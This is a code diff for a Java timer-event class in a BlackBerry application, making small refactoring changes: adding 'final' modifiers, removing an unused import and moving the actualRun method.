@@ -11,9 +11,7 @@ import java.io.EOFException;
 import java.util.Date;
 
 import net.rim.device.api.util.DataBuffer;
-
 import blackberry.Conf;
-import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 import blackberry.utils.Utils;
@@ -30,17 +28,24 @@ public class TimerEvent extends Event {
 
     Date timestamp;
 
-    public TimerEvent(int actionId, byte[] confParams) {
+    public TimerEvent(final int actionId, final byte[] confParams) {
         super(Event.EVENT_TIMER, actionId, confParams);
     }
-    
-    public TimerEvent(int actionId_, int type_, int loDelay_, int hiDelay_) {
+
+    public TimerEvent(final int actionId_, final int type_, final int loDelay_,
+            final int hiDelay_) {
         super(Event.EVENT_TIMER, actionId_, "TimerEvent");
         this.type = type_;
         this.loDelay = loDelay_;
         this.hiDelay = hiDelay_;
         init();
     }
+
+    protected void actualRun() {
+        debug.trace("actualRun");
+        trigger();
+    }
+
     private void init() {
 
         switch (this.type) {
@@ -62,12 +67,12 @@ public class TimerEvent extends Event {
             long tmpTime = hiDelay << 32;
             tmpTime += loDelay;
             //#mdebug
-            Date date = new Date(tmpTime);
-            debug.trace("TimerDate: "+ date);
+            final Date date = new Date(tmpTime);
+            debug.trace("TimerDate: " + date);
             //#enddebug
 
             setPeriod(NEVER);
-            long now = Utils.getTime();
+            final long now = Utils.getTime();
             setDelay(tmpTime - now);
             break;
         case Conf.CONF_TIMER_DELTA:
@@ -82,13 +87,8 @@ public class TimerEvent extends Event {
         }
     }
 
-    protected void actualRun() {
-        debug.trace("actualRun");
-        trigger();
-    }
-
-    protected boolean parse(byte[] confParams) {
-        DataBuffer databuffer = new DataBuffer(confParams, 0,
+    protected boolean parse(final byte[] confParams) {
+        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                 confParams.length, false);
 
         try {
@@ -99,7 +99,7 @@ public class TimerEvent extends Event {
             // #debug
             debug.trace("type: " + type + " lo:" + loDelay + " hi:" + hiDelay);
 
-        } catch (EOFException e) {
+        } catch (final EOFException e) {
             // #debug
             debug.error("params FAILED");
             return false;
